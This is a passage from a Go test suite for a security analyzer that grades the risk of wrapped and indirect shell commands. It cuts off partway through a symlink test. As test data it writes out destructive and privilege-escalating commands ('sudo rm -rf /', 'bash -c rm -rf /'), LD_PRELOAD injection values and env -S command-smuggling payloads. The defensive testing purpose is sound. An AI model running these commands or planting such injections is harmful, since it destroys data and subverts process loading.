//go:build test

package security

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/risktypes"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/runnertypes"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// analyzeIndirectCmd is a terse helper for calling the resolver in tests.
func analyzeIndirectCmd(cmd string, args ...string) IndirectExecutionResult {
	return AnalyzeIndirectExecution(cmd, args)
}

// hasArtifactPath reports whether the artifact list contains an entry for path.
func hasArtifactPath(arts []risktypes.ExecutedArtifact, path string) bool {
	for _, a := range arts {
		if a.Path == path {
			return true
		}
	}
	return false
}

// hasReason reports whether the result carries the given reason code.
func hasReason(res IndirectExecutionResult, code risktypes.ReasonCode) bool {
	for _, c := range res.ReasonCodes {
		if c == code {
			return true
		}
	}
	return false
}

// TestIndirect_WrapperSudoCritical verifies a privilege token reached through a
// wrapper (env/timeout/xargs) is Critical.
func TestIndirect_WrapperSudoCritical(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env sudo", "env", []string{"sudo", "ls"}},
		{"timeout sudo", "timeout", []string{"5", "sudo", "rm"}},
		{"xargs sudo", "xargs", []string{"sudo", "rm"}},
		{"nice sudo", "nice", []string{"-n", "10", "sudo", "ls"}},
		{"env -S sudo", "env", []string{"-S", "sudo rm -rf /"}},
		// Short-option cluster where a value-taking option (-c) sits at the end and
		// consumes the next token: "ionice -tc 2 sudo ls" runs "sudo ls" at class 2.
		// The cluster must be parsed so "2" is -c's value, not mistaken for the
		// command, which would hide sudo and bypass the privilege gate.
		{"ionice cluster sudo", "ionice", []string{"-tc", "2", "sudo", "ls"}},
		{"nice cluster sudo", "nice", []string{"-n", "5", "sudo", "ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectCritical, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelCritical, res.Level)
			assert.True(t, hasReason(res, risktypes.ReasonPrivilegeEscalation))
		})
	}
}

// TestIndirect_WrapperSystemModificationHighFloor verifies that a
// system-modification command reached through a wrapper (env) is a High floor.
// This is a regression guard: the wrapper inner is High regardless of its content
// (it does not go through SystemModificationRisk), so the name-only classification
// change does not affect this conclusion.
func TestIndirect_WrapperSystemModificationHighFloor(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		{"env dpkg", []string{"dpkg", "-i", "pkg.deb"}},
		{"env systemctl restart", []string{"systemctl", "restart", "nginx"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("env", tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_Taskset verifies taskset's inner command is resolved for both the
// positional MASK form and the -c/--cpu-list form (separated, attached, clustered).
// A value-supplied affinity means there is no positional MASK, so a privilege token
// must not be missed by skipping a real command token.
func TestIndirect_Taskset(t *testing.T) {
	// Forms whose inner command is sudo -> Critical (privilege escalation).
	for _, tc := range []struct {
		name string
		args []string
	}{
		{"positional mask", []string{"0x3", "sudo", "ls"}},
		{"cpu-list separated", []string{"-c", "0-3", "sudo", "ls"}},
		{"cpu-list attached short", []string{"-c0-3", "sudo", "ls"}},
		{"cpu-list attached long", []string{"--cpu-list=0-3", "sudo", "ls"}},
		{"cpu-list separated long", []string{"--cpu-list", "0-3", "sudo", "ls"}},
		{"cpu-list clustered", []string{"-ac", "0-3", "sudo", "ls"}},
		{"cpu-list clustered attached", []string{"-ac0-3", "sudo", "ls"}},
		{"all-tasks then mask", []string{"-a", "0x3", "sudo", "ls"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("taskset", tc.args...)
			assert.Equalf(t, IndirectCritical, res.Kind, "taskset %v must reach sudo (Critical)", tc.args)
		})
	}

	// A benign inner command is a flat High floor too (this case checks Kind only);
	// the -p/--pid form runs no command.
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("taskset", "0x3", "ls").Kind)
	assert.NotEqual(t, IndirectCritical, analyzeIndirectCmd("taskset", "-c", "0-3", "ls").Kind)
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("taskset", "-p", "0x1", "1234").Kind)
	// Clustered -p (e.g. "-ap") is the PID form too: no command runs, so the PID is
	// not mistaken for a MASK and a following token is not evaluated as a command.
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("taskset", "-ap", "1234").Kind)
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("taskset", "-ap", "1234", "sudo", "ls").Kind)

	// A wrapped destructive inner command via -c is still folded to High.
	rm := analyzeIndirectCmd("taskset", "-c0-3", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, rm.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, rm.Level)
}

// TestIndirect_WrapperDestructive verifies a wrapped destructive or
// system-modification command keeps a risk at least as high as the unwrapped form.
func TestIndirect_WrapperDestructive(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want runnertypes.RiskLevel
	}{
		{"env rm -rf", "env", []string{"rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"timeout systemctl stop", "timeout", []string{"10", "systemctl", "stop", "nginx"}, runnertypes.RiskLevelHigh},
		{"nice -n 5 rm -rf", "nice", []string{"-n", "5", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"chrt deadline opts rm", "chrt", []string{"-T", "1000", "-P", "2000", "0", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"timeout -- terminator", "timeout", []string{"--", "5", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, tc.want, res.Level)
		})
	}
}

// TestIndirect_WrapperInnerFlatHigh verifies a benign extractable inner command
// is a flat High floor with the single indirect_execution_wrapper reason code,
// regardless of how harmless the inner command is.
func TestIndirect_WrapperInnerFlatHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env echo", "env", []string{"echo", "hi"}},
		{"timeout echo", "timeout", []string{"5", "echo", "hi"}},
		{"nice build script", "nice", []string{"-n", "10", "build.sh"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			assert.Equal(t, []risktypes.ReasonCode{risktypes.ReasonIndirectExecutionWrapper}, res.ReasonCodes)
		})
	}
}

// TestIndirect_WrapperProfileFactors verifies a wrapped command's inner risk
// profile (network / data-exfiltration) is no longer folded: every extractable
// wrapper inner is a flat High floor regardless of the inner's profile.
func TestIndirect_WrapperProfileFactors(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want runnertypes.RiskLevel
	}{
		{"env claude", "env", []string{"claude"}, runnertypes.RiskLevelHigh},
		{"env curl url", "env", []string{"curl", "https://example.com"}, runnertypes.RiskLevelHigh},
		{"timeout wget", "timeout", []string{"5", "wget", "http://example.com"}, runnertypes.RiskLevelHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, tc.want, res.Level)
		})
	}
}

// TestIndirect_ShellInlineHigh verifies inline shell/interpreter code is High.
// Shells use -c only; interpreters also use -e.
func TestIndirect_ShellInlineHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"bash -c", "bash", []string{"-c", "rm -rf /"}},
		{"sh -c", "sh", []string{"-c", "echo hi"}},
		{"python -c", "python", []string{"-c", "import os"}},
		{"perl -e", "perl", []string{"-e", "print 1"}},
		{"node -e", "node", []string{"-e", "process.exit()"}},
		{"bash combined -xc", "bash", []string{"-xc", "rm -rf /"}},
		{"bash combined -ic", "bash", []string{"-ic", "evil"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}

	// "bash -e script.sh" is errexit, not inline code: it must not be flagged via
	// the inline path (-e is not an inline flag for shells).
	res := analyzeIndirectCmd("bash", "-e", "script.sh")
	assert.NotEqual(t, IndirectReject, res.Kind)
}

// TestIndirect_WrappedRunnerSingleReasonCode verifies a wrapper inner returns the
// single indirect_execution_wrapper reason code rather than accumulating the
// inner's own dimension reasons: "env bash -c ..." is a flat High floor, so the
// inner's arbitrary-code reason is no longer folded into the result.
func TestIndirect_WrappedRunnerSingleReasonCode(t *testing.T) {
	res := analyzeIndirectCmd("env", "bash", "-c", "echo hi")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, []risktypes.ReasonCode{risktypes.ReasonIndirectExecutionWrapper}, res.ReasonCodes)
}

// TestIndirect_InnerCommandGated verifies the extracted inner command is neither
// allowlist- nor hash-gated but flattened to a High floor, while Reject and
// Critical dispositions still propagate and the inner is recorded as a chain
// artifact. This is the redefinition of the earlier extract-and-gate behavior to
// a flat High floor.
func TestIndirect_InnerCommandGated(t *testing.T) {
	// A benign or destructive inner is a flat High floor; the inner is recorded as a
	// chain artifact.
	res := analyzeIndirectCmd("env", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
	require.NotEmpty(t, res.Artifacts)
	found := false
	for _, a := range res.Artifacts {
		if a.Role == risktypes.RoleInner && filepath.Base(a.Path) == "rm" {
			found = true
		}
	}
	assert.True(t, found, "inner command must be recorded as a RoleInner artifact")

	// An inner form that cannot be identity-bound (find -exec child process)
	// propagates as a rejection rather than passing the gate.
	rej := analyzeIndirectCmd("env", "find", "/tmp", "-exec", "rm", "{}", ";")
	assert.Equal(t, IndirectReject, rej.Kind)

	// The inner command is recorded as a chain artifact even on deny paths
	// (Critical), so the indirect-execution chain stays auditable.
	crit := analyzeIndirectCmd("env", "sudo", "ls")
	assert.Equal(t, IndirectCritical, crit.Kind)
	assert.True(t, hasArtifactPath(crit.Artifacts, "sudo"), "deny path must still record the inner artifact")
}

// TestIndirect_WrapperNoCommandMedium verifies a wrapper invoked with no inner
// command is Medium and is distinct from an unextractable (rejected) form.
func TestIndirect_WrapperNoCommandMedium(t *testing.T) {
	// Wrappers with no safe TOML alternative keep a Medium no-command floor (env and
	// timeout, which are redundant-with-config, are High and covered separately by
	// TestIndirect_EnvTimeoutNoCommandHigh).
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"nice bare", "nice", nil},
		{"nice adjustment only", "nice", []string{"-n", "10"}},
		{"ionice class only", "ionice", []string{"-c", "2"}},
		{"stdbuf bare", "stdbuf", nil},
		{"setsid bare", "setsid", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelMedium, res.Level)
		})
	}
}

// TestIndirect_EnvTimeoutNoCommandHigh verifies env and timeout, which have safe
// TOML alternatives (env_vars/env_import, timeout), contribute a High floor even in
// a no-command form. The floor is per-wrapper and applies through nesting, so
// "nice timeout 5" is High as well. A timeout form carrying only value-less options
// (timeout --foreground 5, timeout -v 5) reaches the High floor instead of failing
// closed on an unrecognized option.
func TestIndirect_EnvTimeoutNoCommandHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env only assignment", "env", []string{"FOO=bar"}},
		{"env bare", "env", nil},
		{"timeout duration only", "timeout", []string{"5"}},
		{"nice timeout nested", "nice", []string{"timeout", "5"}},
		{"timeout --foreground no command", "timeout", []string{"--foreground", "5"}},
		{"timeout -v no command", "timeout", []string{"-v", "5"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_EnvPathResolutionSwap verifies env overriding PATH with a bare
// inner command is rejected (the inner cannot be resolved safely), while an
// absolute inner command is still resolved.
func TestIndirect_EnvPathResolutionSwap(t *testing.T) {
	rej := analyzeIndirectCmd("env", "PATH=/tmp", "rm", "-rf", "/")
	assert.Equal(t, IndirectReject, rej.Kind)

	// Absolute inner path is unaffected by the PATH override: it resolves and the
	// destructive risk is folded.
	ok := analyzeIndirectCmd("env", "PATH=/tmp", "/bin/rm", "-rf", "/")
	assert.Equal(t, IndirectFloor, ok.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, ok.Level)
}

// TestIndirect_WrapperLoaderEnvRejected verifies loader-control environment
// variables supplied through env are rejected on every OS.
func TestIndirect_WrapperLoaderEnvRejected(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		{"LD_PRELOAD", []string{"LD_PRELOAD=/tmp/evil.so", "ls"}},
		{"LD_LIBRARY_PATH", []string{"LD_LIBRARY_PATH=/tmp", "ls"}},
		{"LD_AUDIT", []string{"LD_AUDIT=/tmp/a.so", "ls"}},
		{"DYLD_INSERT_LIBRARIES", []string{"DYLD_INSERT_LIBRARIES=/tmp/x.dylib", "ls"}},
		// Any LD_*/DYLD_* is rejected by prefix, not just the well-known names, so
		// less common loader variables cannot weaken the fail-closed posture.
		{"LD_DEBUG", []string{"LD_DEBUG=all", "ls"}},
		{"LD_BIND_NOW", []string{"LD_BIND_NOW=1", "ls"}},
		{"DYLD_LIBRARY_PATH", []string{"DYLD_LIBRARY_PATH=/tmp", "ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("env", tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
			assert.True(t, hasReason(res, risktypes.ReasonForbiddenEnvVar))
		})
	}
}

// TestIndirect_EnvChdirRejected verifies env -C/--chdir fails closed: changing the
// working directory before exec would alter how a relative inner command resolves,
// so the form cannot be bound to a concrete artifact.
func TestIndirect_EnvChdirRejected(t *testing.T) {
	for _, args := range [][]string{
		{"-C", "/some/dir", "ls"},
		{"--chdir", "/some/dir", "ls"},
		{"--chdir=/some/dir", "ls"},
		{"-C/some/dir", "ls"},       // attached short form
		{"-C", "/some/dir", "rm"},   // even a benign-looking inner is rejected
		{"-C", "/some/dir", "sudo"}, // chdir is checked before the inner is evaluated
	} {
		assert.Equalf(t, IndirectReject, analyzeIndirectCmd("env", args...).Kind,
			"env %v must fail closed on chdir", args)
	}

	// "-C" appearing after the "--" terminator is a literal command name, not the
	// chdir option, so it is not rejected on that basis.
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "-C").Kind)
}

// TestIndirect_CoreutilsInnerFolded verifies a wrapped coreutils inner command is
// absorbed into the flat High floor: the coreutils-specific classification and its
// fail-closed Reject are no longer applied to a wrapper inner (RoleInner), so the
// result is High with the indirect_execution_wrapper reason in both the
// classifiable and the stat-failure cases.
func TestIndirect_CoreutilsInnerFolded(t *testing.T) {
	dir := t.TempDir()
	SetCoreutilsDirForTest(t, dir)
	// An unknown coreutils applet (not in the safe or destructive list) is a flat
	// High floor. Non-shebang content so it is not read as a script.
	applet := filepath.Join(dir, "mysteryutil")
	require.NoError(t, os.WriteFile(applet, []byte{0x7f, 'E', 'L', 'F', 0, 0}, 0o755))

	res := analyzeIndirectCmd("env", applet, "x")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level, "wrapped coreutils applet must be a flat High floor")
	assert.Equal(t, []risktypes.ReasonCode{risktypes.ReasonIndirectExecutionWrapper}, res.ReasonCodes)

	// A coreutils file-info failure (a path under the coreutils dir that cannot be
	// stat'd) no longer produces a coreutils-specific fail-closed Reject for a
	// wrapper inner: it is absorbed into the flat High floor. This is not a
	// regression (High requires explicit risk_level = "high" opt-in, and the outer
	// wrapper binary is still hash-gated at rank 1).
	ghost := filepath.Join(dir, "ghost") // under coreutilsDir, does not exist
	deny := analyzeIndirectCmd("env", ghost, "x")
	assert.Equal(t, IndirectFloor, deny.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, deny.Level)
	assert.Equal(t, []risktypes.ReasonCode{risktypes.ReasonIndirectExecutionWrapper}, deny.ReasonCodes)
}

// TestIndirect_InterpreterReasonsCollected verifies the RoleInterpreter path (a
// shebang interpreter of a direct script execution) still collects a profiled
// command's human-readable reasons. This locks the fine-grained behavior the
// flat-High change preserves for interpreters: only the RoleInner (wrapper inner)
// path stops collecting profile reasons. curl is a bare name, so
// ResolveCommandNames resolves it to itself and ResolveProfile matches by name.
func TestIndirect_InterpreterReasonsCollected(t *testing.T) {
	res := evaluateInnerAs("curl", []string{"https://example.com"}, 0, risktypes.RoleInterpreter)
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Contains(t, res.Reasons, "Always performs network operations",
		"the interpreter path must still carry profile reasons")
}

// TestIndirect_EnvSplitString verifies env -S split-string interpretation:
// a hidden sudo is Critical, a destructive inner is folded, an empty split is
// rejected.
func TestIndirect_EnvSplitString(t *testing.T) {
	crit := analyzeIndirectCmd("env", "-S", "sudo rm -rf /")
	assert.Equal(t, IndirectCritical, crit.Kind)

	high := analyzeIndirectCmd("env", "-S", "rm -rf /tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	empty := analyzeIndirectCmd("env", "-S", "   ")
	assert.Equal(t, IndirectReject, empty.Kind)

	// Combined --split-string= form is parsed the same way.
	combined := analyzeIndirectCmd("env", "--split-string=sudo ls")
	assert.Equal(t, IndirectCritical, combined.Kind)

	// Arguments after the split-string are not discarded: env -S prepends the
	// split tokens to the remaining argv, so a hidden sudo there is still Critical.
	remaining := analyzeIndirectCmd("env", "-S", "env", "sudo", "ls")
	assert.Equal(t, IndirectCritical, remaining.Kind)

	// A payload using env -S escape/quote/substitution processing cannot be
	// faithfully whitespace-split, so it must fail closed (Reject) rather than
	// silently mis-tokenize and let a hidden command through.
	for _, payload := range []string{`sudo\tls`, `'sudo' ls`, `"sudo" ls`, `${X} ls`, `sudo ls #comment`, "`whoami` ls"} {
		res := analyzeIndirectCmd("env", "-S", payload)
		assert.Equalf(t, IndirectReject, res.Kind, "payload %q must fail closed", payload)
	}
}

// TestIndirect_NestedWrapperAndDepthGuard verifies the resolver recurses through
// nested wrappers (so a deeply wrapped privilege or destructive command is still
// caught) and that the recursion depth guard rejects a pathologically deep chain.
func TestIndirect_NestedWrapperAndDepthGuard(t *testing.T) {
	// Nested wrapper reaching a privilege token stays Critical.
	crit := analyzeIndirectCmd("env", "timeout", "5", "sudo", "ls")
	assert.Equal(t, IndirectCritical, crit.Kind)

	// Nested wrapper reaching a destructive command stays High.
	high := analyzeIndirectCmd("env", "nice", "-n", "5", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	// A chain of wrappers deeper than the recursion guard is rejected rather than
	// silently bottoming out.
	deep := make([]string, indirectExecMaxDepth+2)
	for i := range deep {
		deep[i] = "env"
	}
	deep[len(deep)-1] = "ls"
	res := analyzeIndirectCmd("env", deep...)
	assert.Equal(t, IndirectReject, res.Kind)
}

// TestIndirect_FindXargsTargetGated verifies find/xargs child-process exec forms
// are rejected (they cannot be identity-bound), while a find without an exec
// action is not an indirect form.
func TestIndirect_FindXargsTargetGated(t *testing.T) {
	for _, action := range []string{"-exec", "-execdir", "-ok", "-okdir"} {
		t.Run("find "+action, func(t *testing.T) {
			res := analyzeIndirectCmd("find", "/tmp", "-name", "*.x", action, "rm", "{}", ";")
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}

	xargs := analyzeIndirectCmd("xargs", "-I", "{}", "rm", "{}")
	assert.Equal(t, IndirectReject, xargs.Kind)
	// The extracted target must be recorded as an artifact so the chain is
	// traceable in audits even on reject paths.
	assert.Equal(t, 1, len(xargs.Artifacts), "xargs must record the target artifact")
	assert.Equal(t, "rm", xargs.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, xargs.Artifacts[0].Role)

	// find -exec sudo is Critical; sudo must appear in the artifact chain.
	sudoFind := analyzeIndirectCmd("find", "/tmp", "-exec", "sudo", "rm", "{}", ";")
	assert.Equal(t, IndirectCritical, sudoFind.Kind)
	assert.Equal(t, 1, len(sudoFind.Artifacts))
	assert.Equal(t, "sudo", sudoFind.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, sudoFind.Artifacts[0].Role)

	plain := analyzeIndirectCmd("find", "/tmp", "-type", "f")
	assert.Equal(t, IndirectNone, plain.Kind)

	// An exec primary with no following command token (e.g. the primary is the last
	// argument) is a malformed exec form: it must fail closed, not fall through to
	// IndirectNone as if it were a plain search.
	for _, action := range []string{"-exec", "-execdir", "-ok", "-okdir"} {
		assert.Equalf(t, IndirectReject, analyzeIndirectCmd("find", "/tmp", action).Kind,
			"find ... %s with no command token must fail closed", action)
	}

	// xargs shares the getopt operand scanner, so the "--" terminator and the
	// fail-closed-on-unknown-long rule apply here too. "xargs -- sudo" runs sudo.
	xargsTerm := analyzeIndirectCmd("xargs", "--", "sudo", "rm")
	assert.Equal(t, IndirectCritical, xargsTerm.Kind, "xargs -- sudo must reach the privilege target")
	// An unknown long option may consume the next token, so the target boundary is
	// unreliable; the xargs form is deny-only, so it rejects with no target artifact.
	xargsUnknown := analyzeIndirectCmd("xargs", "--unknown-long", "rm")
	assert.Equal(t, IndirectReject, xargsUnknown.Kind)
	assert.Empty(t, xargsUnknown.Artifacts, "an unreliable xargs scan records no target artifact")
}

// TestSkipLeadingOptions verifies the shared getopt operand scanner that the
// wrapper, xargs, and package-runner classifiers all build on: the "--"
// terminator, separated/attached value-options, and the two unknown-option
// policies. Locking it here keeps the option-surface handling consistent across
// every call site instead of being re-derived per classifier.
func TestSkipLeadingOptions(t *testing.T) {
	valueOpts := setOf("-s", "--signal")
	for _, tc := range []struct {
		name         string
		args         []string
		unknown      unknownOptionPolicy
		wantIdx      int
		wantReliable bool
	}{
		{"no options", []string{"cmd", "a"}, shortOptsAreBoolean, 0, true},
		{"separated value option", []string{"-s", "KILL", "cmd"}, shortOptsAreBoolean, 2, true},
		{"attached long value", []string{"--signal=KILL", "cmd"}, shortOptsAreBoolean, 1, true},
		{"dash terminator", []string{"--", "-weird"}, shortOptsAreBoolean, 1, true},
		{"lone dash is operand", []string{"-"}, shortOptsAreBoolean, 0, true},
		{"no operand", []string{"-s", "KILL"}, shortOptsAreBoolean, 2, true},
		// shortOptsAreBoolean: unknown short is assumed value-less, unknown long fails closed.
		{"unknown short assumed boolean", []string{"-x", "cmd"}, shortOptsAreBoolean, 1, true},
		{"unknown long unreliable", []string{"--mystery", "cmd"}, shortOptsAreBoolean, 1, false},
		// anyUnknownIsUnreliable: any unrecognized option (short or long) fails closed.
		{"strict unknown short unreliable", []string{"-x", "cmd"}, anyUnknownIsUnreliable, 1, false},
		{"strict unknown long unreliable", []string{"--mystery", "cmd"}, anyUnknownIsUnreliable, 1, false},
		// An attached "=" form is self-contained, so it is safe even under the strict policy.
		{"strict attached value safe", []string{"--mystery=v", "cmd"}, anyUnknownIsUnreliable, 1, true},
		// Short-option clusters: a value-taking option at the end of a cluster
		// consumes the next token, so the operand boundary lands past that value.
		{"cluster value opt last takes next", []string{"-xs", "KILL", "cmd"}, shortOptsAreBoolean, 2, true},
		// A value-taking option not at the end takes the remainder of the token as
		// its attached value, so the next token is the operand.
		{"cluster value opt with attached value", []string{"-sKILL", "cmd"}, shortOptsAreBoolean, 1, true},
		// A cluster of only boolean shorts leaves the next token as the operand.
		{"cluster all boolean", []string{"-xy", "cmd"}, shortOptsAreBoolean, 1, true},
		// Under the strict policy an unknown option inside a cluster fails closed.
		{"strict unknown in cluster", []string{"-xs", "cmd"}, anyUnknownIsUnreliable, 1, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			idx, reliable := skipLeadingOptions(tc.args, optSpec{valueOpts: valueOpts, unknown: tc.unknown})
			assert.Equal(t, tc.wantReliable, reliable)
			if tc.wantReliable {
				assert.Equal(t, tc.wantIdx, idx)
			}
		})
	}
}

// TestSkipLeadingOptions_BoolOptsAndLenient covers the two optSpec features added
// to absorb the systemctl and git subcommand scanners: a boolOpts allowlist
// (known value-less options skipped even under a fail-closed unknown policy) and
// the allUnknownAreBoolean lenient policy (unknown long options skipped, not
// treated as unreliable).
func TestSkipLeadingOptions_BoolOptsAndLenient(t *testing.T) {
	// boolOpts: --quiet/-q are known value-less; -t is value-taking; an unknown
	// option still fails closed under anyUnknownIsUnreliable.
	spec := optSpec{
		valueOpts: setOf("-t", "--type"),
		boolOpts:  setOf("--quiet", "-q"),
		unknown:   anyUnknownIsUnreliable,
	}
	idx, reliable := skipLeadingOptions([]string{"--quiet", "status"}, spec)
	assert.True(t, reliable)
	assert.Equal(t, 1, idx, "known boolean long option is skipped, not treated as unknown")

	idx, reliable = skipLeadingOptions([]string{"-qt", "service", "status"}, spec)
	assert.True(t, reliable)
	assert.Equal(t, 2, idx, "cluster -q(bool)+ -t(value at end) consumes the value token")

	_, reliable = skipLeadingOptions([]string{"--mystery", "status"}, spec)
	assert.False(t, reliable, "an unknown option still fails closed under anyUnknownIsUnreliable")

	// allUnknownAreBoolean: an unknown long option is skipped (lenient), so the
	// operand after it is still located.
	lenient := optSpec{valueOpts: setOf("-c"), unknown: allUnknownAreBoolean}
	idx, reliable = skipLeadingOptions([]string{"--no-pager", "clone"}, lenient)
	assert.True(t, reliable)
	assert.Equal(t, 1, idx, "unknown long option is assumed boolean and skipped under the lenient policy")
}

// TestIndirect_DynamicLoaderGated verifies a direct dynamic-loader invocation is
// rejected.
func TestIndirect_DynamicLoaderGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"ld-linux preload", "/lib64/ld-linux-x86-64.so.2", []string{"--preload", "/tmp/x.so", "/bin/ls"}},
		{"ld-linux library-path", "ld-linux-x86-64.so.2", []string{"--library-path", "/tmp", "/bin/ls"}},
		{"ld.so", "ld.so", []string{"/bin/ls"}},
		{"macos dyld", "dyld", []string{"/bin/ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}
}

// TestIndirect_BrokenSymlinkChainFailsClosed verifies that a command (or wrapped
// inner command) whose symlink chain cannot be fully resolved fails closed with a
// symlink-resolution reason, rather than being classified from an incomplete name
// set (which could miss a privilege/loader name past the break and fail open).
func TestIndirect_BrokenSymlinkChainFailsClosed(t *testing.T) {
	dir := t.TempDir()
	// A dangling symlink: its target does not exist, so strict resolution fails at
	// the next hop.
	broken := filepath.Join(dir, "cmd")
	require.NoError(t, os.Symlink(filepath.Join(dir, "missing"), broken))

	// Top-level command (analyzeIndirect): fail closed.
	top := analyzeIndirectCmd(broken)
	assert.Equal(t, IndirectReject, top.Kind)
	assert.True(t, hasReason(top, risktypes.ReasonSymlinkResolutionFailed))
	assert.Equal(t, risktypes.ErrorClassSymlinkResolution, top.ErrorClass)

	// Wrapped inner command (evaluateInnerAs): fail closed, preserving the artifact
	// chain (the inner command is still recorded for audit).
	inner := analyzeIndirectCmd("env", broken, "arg")
	assert.Equal(t, IndirectReject, inner.Kind)
	assert.True(t, hasReason(inner, risktypes.ReasonSymlinkResolutionFailed))
	assert.Equal(t, risktypes.ErrorClassSymlinkResolution, inner.ErrorClass)
	assert.True(t, hasArtifactPath(inner.Artifacts, broken), "the inner command must be recorded even on the symlink-failure deny")
}

// TestIndirect_WrapperNameCollisionFailsClosed verifies that when a command's
// symlink chain carries both a wrapper name and an unbindable form name (find,
// xargs, the dynamic loader), the stricter reject/Critical disposition wins. The
// chain-name set is order-independent, so a wrapper-named symlink pointing at
// find/xargs/ld-linux must not be short-circuited onto the lenient resolve-inner
// path.
func TestIndirect_WrapperNameCollisionFailsClosed(t *testing.T) {
	// symlinkNamed creates <dir>/<linkName> -> <dir>/<targetName>; both the link
	// name and the target basename land in the resolved chain-name set. The target
	// need not be a real executable: the resolver matches by name only.
	symlinkNamed := func(t *testing.T, linkName, targetName string) string {
		t.Helper()
		dir := t.TempDir()
		target := filepath.Join(dir, targetName)
		require.NoError(t, os.WriteFile(target, []byte{}, 0o644))
		link := filepath.Join(dir, linkName)
		require.NoError(t, os.Symlink(target, link))
		return link
	}

	// A "timeout"-named symlink pointing at find with an -exec sudo primary must be
	// Critical (privilege escalation), not resolved as the timeout wrapper.
	findLink := symlinkNamed(t, "timeout", "find")
	findRes := analyzeIndirectCmd(findLink, "/tmp", "-exec", "sudo", "rm", "{}", ";")
	assert.Equal(t, IndirectCritical, findRes.Kind, "find -exec sudo behind a wrapper-named symlink must stay Critical")

	// A "nice"-named symlink pointing at xargs must be rejected (child-process exec
	// cannot be identity-bound), not resolved as the nice wrapper.
	xargsLink := symlinkNamed(t, "nice", "xargs")
	xargsRes := analyzeIndirectCmd(xargsLink, "rm", "-rf", "/tmp/x")
